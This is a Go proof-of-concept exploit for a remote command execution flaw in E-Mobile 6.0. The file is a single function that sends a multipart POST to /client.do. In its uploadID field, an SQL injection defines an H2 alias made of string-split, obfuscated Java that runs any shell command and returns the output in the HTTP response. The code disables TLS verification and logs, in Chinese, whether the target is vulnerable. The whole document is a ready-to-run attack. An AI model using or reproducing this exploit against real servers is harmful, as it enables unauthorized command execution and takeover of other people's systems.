package poc

import (
	"bytes"
	"crypto/tls"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"strings"
	"time"
)

func E_Mobile_client(target string, cmd string) {
	url := strings.TrimRight(target, "/")
	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)

	_ = writer.WriteField("method", "getupload")
	_ = writer.WriteField("uploadID", `1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagmf('`+cmd+`');--`)

	err := writer.Close()
	if err != nil {
		log.Println("Error:", err)
		return
	}

	request, err := http.NewRequest("POST", url+"/client.do", body)
	if err != nil {
		log.Println("[-] 请求异常:", err)
		return
	}

	request.Header.Set("Content-Type", writer.FormDataContentType())

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}
	response, err := client.Do(request)
	if err != nil {
		log.Println("[-] 请求失败:", err)
		return
	}
	defer response.Body.Close()

	// 读取响应内容
	responseBody, err := io.ReadAll(response.Body)
	if err != nil {
		log.Println("[-] 返回异常:", err)
		return
	}
	if response.StatusCode == http.StatusOK && string(responseBody) != "" {
		log.Println("[+] 存在E-Mobile 6.0远程命令执行漏洞，执行结果：", string(responseBody))
	} else {
		log.Println("[-] 不存在E-Mobile 6.0远程命令执行漏洞")
	}

}
